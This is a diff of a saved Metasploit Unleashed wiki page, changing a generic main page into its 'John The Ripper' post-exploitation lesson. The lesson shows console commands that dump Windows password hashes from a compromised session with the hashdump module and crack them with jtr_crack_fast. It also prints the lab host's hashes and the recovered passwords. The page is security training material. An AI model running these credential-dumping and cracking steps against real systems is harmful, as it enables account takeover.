@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>John The Ripper - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="John_The_Ripper" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:John_The_Ripper&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=John_The_Ripper&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=John_The_Ripper&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,230 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>John The Ripper</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="John_The_Ripper#column-one">navigation</a>, <a href="John_The_Ripper#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>The <b>John The Ripper</b> module uses to identify weak passwords that have been acquired as hashed files (loot) or raw LANMAN/NTLM hashes (hashdump). The goal of this module is to find trivial passwords in a short amount of time. To crack complex passwords or use large wordlists, John the Ripper should be used outside of Metasploit. This initial version just handles LM/NTLM credentials from hashdump and uses the standard wordlist and rules.
 <br />
+<br />
+<pre>
+msf auxiliary(<span style='color:#ff0000;'>handler</span>) > <span style='color:#13C16A;'>use post/windows/gather/hashdump</span>
+msf post(<span style='color:#ff0000;'>hashdump</span>) > <span style='color:#13C16A;'>set session 1</span>
+session => 1
+ 
+msf post(<span style='color:#ff0000;'>hashdump</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Obtaining the boot key...
+<span style='color:#0000FF;'>[*]</span> Calculating the hboot key using SYSKEY bffad2dcc991597aaa19f90e8bc4ee00...
+<span style='color:#0000FF;'>[*]</span> Obtaining the user list and keys...
+<span style='color:#0000FF;'>[*]</span> Decrypting user keys...
+<span style='color:#0000FF;'>[*]</span> Dumping password hashes...
+
+
+Administrator:500:cb5f77772e5178b77b9fbd79429286db:b78fe104983b5c754a27c1784544fda7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:810185b1c0dd86dd756d138f54162df8:7b8f23708aec7107bfdf0925dbb2fed7:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8be4bbf2ad7bd7cec4e1cdddcd4b052e:::
+rAWjAW:1003:aad3b435b51404eeaad3b435b51404ee:117a2f6059824c686e7a16a137768a20:::
+rAWjAW2:1004:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+
+
+<span style='color:#0000FF;'>[*]</span> Post module execution completed
+
+msf post(<span style='color:#ff0000;'>hashdump</span>) > <span style='color:#13C16A;'>use auxiliary/analyze/jtr_crack_fast</span>
+msf auxiliary(<span style='color:#ff0000;'>jtr_crack_fast</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> Seeded the password database with 8 words...
+
+guesses: 3  time: 0:00:00:04 DONE (Sat Jul 16 19:59:04 2011)  c/s: 12951K  trying: WIZ1900 - ZZZ1900
+Warning: passwords printed above might be partial and not be all those cracked
+Use the "--show" option to display all of the cracked passwords reliably
+<span style='color:#0000FF;'>[*]</span> Output: Loaded 7 password hashes with no different salts (LM DES [128/128 BS SSE2])
+<span style='color:#0000FF;'>[*]</span> Output: D                (cred_6:2)
+<span style='color:#0000FF;'>[*]</span> Output: PASSWOR          (cred_6:1)
+<span style='color:#0000FF;'>[*]</span> Output: GG               (cred_1:2)
+Warning: mixed-case charset, but the current hash type is case-insensitive;
+some candidate passwords may be unnecessarily tried more than once.
+guesses: 1  time: 0:00:00:05 DONE (Sat Jul 16 19:59:10 2011)  c/s: 44256K  trying: ||V} - |||}
+Warning: passwords printed above might be partial and not be all those cracked
+Use the "--show" option to display all of the cracked passwords reliably
+<span style='color:#0000FF;'>[*]</span> Output: Loaded 7 password hashes with no different salts (LM DES [128/128 BS SSE2])
+<span style='color:#0000FF;'>[*]</span> Output: Remaining 4 password hashes with no different salts
+<span style='color:#0000FF;'>[*]</span> Output: (cred_2)
+guesses: 0  time: 0:00:00:00 DONE (Sat Jul 16 19:59:10 2011)  c/s: 6666K  trying: 89093 - 89092
+<span style='color:#0000FF;'>[*]</span> Output: Loaded 7 password hashes with no different salts (LM DES [128/128 BS SSE2])
+<span style='color:#0000FF;'>[*]</span> Output: Remaining 3 password hashes with no different salts
+guesses: 1  time: 0:00:00:11 DONE (Sat Jul 16 19:59:21 2011)  c/s: 29609K  trying: zwingli1900 - password1900
+Use the "--show" option to display all of the cracked passwords reliably
+<span style='color:#0000FF;'>[*]</span> Output: Loaded 6 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+<span style='color:#0000FF;'>[*]</span> Output: password         (cred_6)
+guesses: 1  time: 0:00:00:05 DONE (Sat Jul 16 19:59:27 2011)  c/s: 64816K  trying: |||}
+Use the "--show" option to display all of the cracked passwords reliably
+<span style='color:#0000FF;'>[*]</span> Output: Loaded 6 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+<span style='color:#0000FF;'>[*]</span> Output: Remaining 5 password hashes with no different salts
+<span style='color:#0000FF;'>[*]</span> Output: (cred_2)
+guesses: 0  time: 0:00:00:00 DONE (Sat Jul 16 19:59:27 2011)  c/s: 7407K  trying: 89030 - 89092
+<span style='color:#0000FF;'>[*]</span> Output: Loaded 6 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
+<span style='color:#0000FF;'>[*]</span> Output: Remaining 4 password hashes with no different salts
+<span style='color:#00ff00;'>[+]</span> Cracked: Guest: (192.168.184.134:445)
+<span style='color:#00ff00;'>[+]</span> Cracked: rAWjAW2:password (192.168.184.134:445)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>jtr_crack_fast</span>) > </pre>
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Post_Exploitation" title="MSF Post Exploitation">MSF Post Exploitation</a> &gt; John The Ripper</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Privilege_Escalation" title="Privilege Escalation">Privilege Escalation</a> &#124; <a href="PSExec_Pass_The_Hash" title="PSExec Pass The Hash">PSExec Pass The Hash</a> &#124; <a href="Event_Log_Management" title="Event Log Management">Event Log Management</a> &#124; <a href="Fun_With_Incognito" title="Fun With Incognito">Fun With Incognito</a> &#124; <a href="Interacting_With_The_Registry" title="Interacting With The Registry">Interacting With The Registry</a> &#124; <a href="Enabling_Remote_Desktop" title="Enabling Remote Desktop">Enabling Remote Desktop</a> &#124; <a href="Packet_Sniffing" title="Packet Sniffing">Packet Sniffing</a> &#124; <a href="Pivoting" title="Pivoting">Pivoting</a> &#124; <a href="TimeStomp" title="TimeStomp">TimeStomp</a> &#124; <a href="Screen_Capture" title="Screen Capture">Screen Capture</a> &#124; <a href="Searching_For_Content" title="Searching For Content">Searching For Content</a> &#124; <strong class="selflink">John The Ripper</strong></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 489/1000000
+Preprocessor generated node count: 2587/1000000
+Post‐expand include size: 4158/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:68-0!*!0!*!*!*!* and timestamp 20131124100849 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=John_The_Ripper&amp;oldid=836">http://www.offensive-security.com/w/index.php?title=John_The_Ripper&amp;oldid=836</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Post_Exploitation&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Post Exploitation (page does not exist)">MSF Post Exploitation</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +715,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.176 secs. --></body></html>
